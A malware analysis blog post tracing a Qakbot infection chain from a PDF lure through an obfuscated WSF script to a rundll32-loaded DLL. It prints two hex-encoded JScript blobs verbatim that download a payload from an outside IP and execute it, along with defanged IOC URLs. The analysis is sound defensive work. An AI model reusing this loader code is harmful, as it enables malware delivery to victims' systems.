---
layout: single
title: Analyzing Qakbot Malware
date: 3/05/2023
classes: wide
category:
  - Malware Analysis
tags:
  - Qakbot
---

## Intro
Firstly, this post is heavily inspired by [Pr0xylife](https://twitter.com/pr0xylife) and [Phage](https://twitter.com/phage_nz). I've always been really interested in their analysis and the subsequent good deeds contributed to the infosec community. 

What I wanted to show here is some basic, somewhat manual malware analysis of a Qakbot malware sample. The sample was captured in the wild and submitted via [Cryptolaemus](https://twitter.com/Cryptolaemus1), which Pr0xylife also works through. The original post detailing execution flow, samples, and IOCs is [here](https://twitter.com/Cryptolaemus1/status/1653433633821138947).

### Qakbot
Qakbot malware originally built its reputation as a banking trojan, stealing financial data, keystrokes, and credentials. However it has developed over the years, self propagating and serving as a ransomware dropper.

## Setup
### VMs
I'm going to be running a couple VMs for the analysis:

1. [Flare VM](https://github.com/mandiant/flare-vm)
    Flare is a windows based system packaged with a ton of amazing tools and scripts for malware analysis + reverse engineering. I will typically run most malware 
    analysis here. 
2. [Remnux](https://docs.remnux.org/install-distro/get-virtual-appliance)
    Remnux is a Linux based toolkit for malware analysis + reverse engineering.
    
I'm not married to any particular OS, so I will simply chop and change between either Remnux or Flare VM based on which tool I am using and where it's most suited. Some analysis tools out there are optimised for Windows, some for Linux. So it's good to have both available.

## Sample

Browse to [Malware Bazaar](https://bazaar.abuse.ch/) and grab the [sample](https://bazaar.abuse.ch/sample/c974fc0afc08bd056253294691366303b58fc1a6d76fa7c6f837d3932fc049fe/) we're after.

## Analysis
### PDF
The first thing we can do is take an initial look at the sample document:
{% include figure image_path="/assets/images/qbot-analysis/qbot-pdf.PNG" %}

We can see if we hover over the "OPEN" button, our first IOC in the form of hxxp://iisbeac[.]com[.]mx/cache/6440fc77eb9cc.zip. If this URL was not immediately available to us we could use another method for analyzing PDFs. There's a few tools out there, but I find this one reliable: [peepdf](https://github.com/jesparza/peepdf). I use Remnux to run this tool, here is the output when run against our sample:
{% include figure image_path="/assets/images/qbot-analysis/peepdf.PNG" %}

Peepdf allows you to analyze the objects located within the pdf, for our malicous document - we can clearly see one object containing a URI. We can then interact with that object to provide our url:
{% include figure image_path="/assets/images/qbot-analysis/Object105.PNG" %}

### .zip > .wsf
Once we have downloaded the ZIP file, we extract it to provide us with our next file in our execution flow "Claim_E670.wsf":
{% include figure image_path="/assets/images/qbot-analysis/wsf-file.PNG" %}

Opening the wsf file with notepad++ we're presented initially with a bunch of random text extracted from phylosophical literature, followed by xml code:
{% include figure image_path="/assets/images/qbot-analysis/original-wsf.PNG" %}

What I did with this file, is copied only the XML code into another file to save and analyze. The code is riddled with obfuscation for example:

{% highlight xml %}
var aDEuYUAe8bJFX = true;
var aqMkpSres = "aIsnpGtkWPOaF1";
aMYWQAjkgv9Eh = aqMkpSres.length;
var aCo8mNRxPBIub = false;
agzaeRlBWhJEGSITb = 11957;
var axeDvq1oWChbjH5mf = 49964;
aOJVyEQRtZN = 29114;
au6rfgJzP9hEw = "aGSKaVbCflxF";
{% endhighlight %}

However sifting through, you can spot variables being assigned to what looks like a bunch of hex:

{% include figure image_path="/assets/images/qbot-analysis/hex-1.PNG" %}

The next thing we can do is run a Powershell command against the file looking for particularly lengthy inputs:

{% highlight powershell %}
get-content .\Claim_E670.wsf | Where-Object {$_.Length -gt 50} > output.txt
{% endhighlight %}

The output leaves us with 2 notable variables:

{% highlight xml %}
var ayTtoW7hgq = "3c003f0078006d006c002000760065007200730069006f006e003d00220031002e00300022003f003e000d000a003c007000610063006b006100670065003e000d000a003c0063006f006d0070006f006e0065006e0074002000690064003d00220063006f006d0070006900640022003e000d000a003c0073006300720069007000740020006c0061006e00670075006100670065003d0022004a0053006300720069007000740022003e000d000a003c0021005b00430044004100540041005b000d000a000d000a0009007600610072002000680074007400700020003d0020006e0065007700200041006300740069007600650058004f0062006a00650063007400280022006d006900630072006f0073006f00660074002e0078006d006c006800740074007000220029003b000d000a00090068007400740070002e006f00700065006e002800220047004500540022002c002000220068007400740070003a002f002f003100380035002e003200350030002e003200340030002e00320035002f0061004f0042004b006400450041006f006e00440034004e00610054006d0043002e0064006100740022002c002000660061006c007300650029003b000d000a00090068007400740070002e00730065006e006400280029003b000d000a000d000a0009007600610072002000610064006f006400620020003d0020006e0065007700200041006300740069007600650058004f0062006a0065006300740028002200610064006f00640062002e00730074007200650061006d00220029003b000d000a000900610064006f00640062002e00740079007000650020003d00200031003b000d000a000900610064006f00640062002e006f00700065006e00280029003b000d000a000900610064006f00640062002e0077007200690074006500280068007400740070002e0052006500730070006f006e007300650042006f006400790029003b000d000a000900610064006f00640062005b002200730061007600650074006f00660069006c00650022005d002800220063003a005c005c00700072006f006700720061006d0064006100740061005c005c006100390044004600650062006f00320063002e0074006d00700022002c002000320029003b000d000a000d000a005d005d003e000d000a003c002f007300630072006900700074003e000d000a003c002f0063006f006d0070006f006e0065006e0074003e000d000a003c002f007000610063006b006100670065003e";

var aOiwuNDAhTSQXG = "3c003f0078006d006c002000760065007200730069006f006e003d00220031002e00300022003f003e000d000a003c007000610063006b006100670065003e000d000a003c0063006f006d0070006f006e0065006e0074002000690064003d00220063006f006d0070006900640022003e000d000a003c0073006300720069007000740020006c0061006e00670075006100670065003d0022004a0053006300720069007000740022003e000d000a003c0021005b00430044004100540041005b000d000a000d000a0009007600610072002000700072006f00630065007300730020003d0020004700650074004f0062006a0065006300740028002200770069006e006d0067006d00740073003a007b0069006d0070006500720073006f006e006100740069006f006e004c006500760065006c003d0069006d0070006500720073006f006e006100740065007d002100570069006e00330032005f00500072006f006300650073007300220029003b000d000a000900700072006f0063006500730073002e004300720065006100740065002800220043003a005c005c005c005c00570069006e0064006f00770073005c005c005c005c0053007900730057004f005700360034005c005c005c005c00720075006e0064006c006c00330032002e00650078006500200043003a005c005c00500072006f006700720061006d0044006100740061005c005c006100390044004600650062006f00320063002e0074006d0070002c004d006f0074006400220029003b000d000a000d000a005d005d003e000d000a003c002f007300630072006900700074003e000d000a003c002f0063006f006d0070006f006e0065006e0074003e000d000a003c002f007000610063006b006100670065003e";
{% endhighlight %}

[CyberChef](https://cyberchef.io/) is the next tool in our arsenal here. Pasting our first blob of hex we get the following output:

{% include figure image_path="/assets/images/qbot-analysis/cyber-1.PNG" %}

A great start! Still some decoding to work through, so we'll add to our recipe and add the additional hex:

{% include figure image_path="/assets/images/qbot-analysis/cyber-2.PNG" %}

Perfect, we can now see the malicous script in plaintext. We get a few pieces of key information from this finding. 
The script will attempt to perform the following actions using 2 embedded JScript scripts:
1. It will create an ActiveX object "xmlhttp"
2. The object will send a GET request to download file from hxxp://185[.]250[.]240[.]25/aOBKdEAonD4NaTmC.dat
3. Another ActiveX object is created "adodb.stream". This object writes the response body of the request to file and saves to path "c:\\programdata\\a9DFebo2c.tmp"
4. The next JScript script utilizes winmgmts which is the WMI service to create a Win32 Process with impersonation privileges
5. This process is then used to execute the final command which runs rundll32.exe to load a9DFebo2c.tmp, executing the function named "Motd"

From this last command, we can conclude the downloaded file is a malicious .dll

### DLL

Finally, I like to run the sample in a commercial sandbox, the one I am privy to being Recorded Future's Triage. [Community Version](https://tria.ge/)

To make sure the sandbox runs correctly using a dll, I will create a batch script to invoke the dll using rundll32.exe. I will then zip the batch script with the dll and submit both.

Here is the result for our sample:
{% include figure image_path="/assets/images/qbot-analysis/RF.PNG" %}

The sandbox provides the extracted malware config, IOCs, TTPs, and a detailed analysis of the 2nd stage malware we submitted. Now we can see the full execution flow from 1st stage malware to 2nd stage as per Cryptolaemus' original [post](https://twitter.com/Cryptolaemus1/status/1653433633821138947) .pdf > .zip > .wsf > xmlhttp > .dll

This is where our analysis ends. From here, we could head into reverse engineering the qakbot.dll file. That may well end up in the next post, no promises, again - I'm just rambling. :v:

